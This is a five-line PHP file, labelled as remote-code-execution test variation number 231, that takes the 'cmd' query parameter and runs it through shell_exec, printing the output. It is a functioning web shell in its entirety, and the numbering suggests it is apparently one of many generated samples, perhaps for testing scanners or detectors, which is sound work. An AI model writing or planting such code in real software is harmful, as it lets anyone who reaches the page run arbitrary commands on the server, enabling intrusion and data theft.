<?php
// RCE test variation #231
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>